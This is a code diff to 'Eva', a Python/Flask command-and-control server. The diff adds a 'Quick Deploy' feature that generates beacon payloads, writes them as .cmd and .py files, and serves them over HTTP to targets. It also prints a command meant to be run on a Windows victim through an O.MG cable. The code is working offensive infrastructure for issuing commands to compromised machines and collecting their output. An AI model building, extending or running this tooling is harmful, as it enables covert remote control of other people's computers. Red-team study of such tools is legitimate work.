@@ -4,11 +4,12 @@ Eva - Python C2 Server (via Flask Webhook)
 Copyright (C) 2025 Trigat
 """
 
-from flask import Flask, abort, request, Response
+from flask import Flask, abort, request, Response, send_from_directory
 from datetime import datetime
 import deploy_beacon
 import base64
 import sys
+import os
 
 app = Flask(__name__)
 
@@ -18,16 +19,20 @@ client_output_log = {}  # Stores output per client
 os_map = {"win": "w", "lin": "l", "mac": "m", "w": "w", "l": "l", "m": "m"}
 os_fullname = {"w": "win", "l": "lin", "m": "mac"}
 
+current_dir = os.path.dirname(__file__)
+
 if len(sys.argv) > 1:
     server_url = f"{sys.argv[1]}"
 else:
     from deploy_beacon import get_local_ip
     server_url = f"http://{get_local_ip()}:8000"
 
-beacon_code = deploy_beacon.generate_beacon(server_url)
+beacon_code = deploy_beacon.generate_http_cmd(server_url)
 
 print("\n[*] Execute this command on Windows target via O.MG or command prompt:\n")
 print(beacon_code.strip() + "\n\n")
+
+print(f"More beacons can be found in the server's local /qd/ (Quick Deploy) directory.\n\n")
 
 @app.route("/cmd/<b64>", methods=["GET"])
 def set_cmd(b64):
@@ -126,6 +131,34 @@ def clear_output():
     except Exception as e:
         print(f"[!] Error clearing log file: {e}")
     return "Output cleared\n"
+
+# Quick Deploy
+@app.route("/qd/<path:filename>", methods=["GET"])
+def serve_qd_file(filename):
+    qd_path = os.path.join(current_dir, "qd")
+    return send_from_directory(qd_path, filename)
+
+def write_qd(path, content):
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content.strip())
+
+@app.route("/qd", methods=["GET"])
+def list_qd_files():
+    if request.remote_addr != "127.0.0.1":
+        abort(403)
+
+    qd_path = os.path.join(current_dir, "qd")
+    try:
+        files = os.listdir(qd_path)
+        if not files:
+            return Response("[No payloads available]", mimetype="text/plain")
+        listing = "\n".join(f"http://{request.host}/qd/{f}" for f in files)
+        return Response(listing, mimetype="text/plain")
+    except Exception as e:
+        return Response(f"[!] Error: {e}", mimetype="text/plain")
+
+write_qd(current_dir + '/qd/qd_http.cmd', beacon_code)
+write_qd(current_dir + '/qd/qd_http.py', deploy_beacon.generate_http_python(server_url))
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
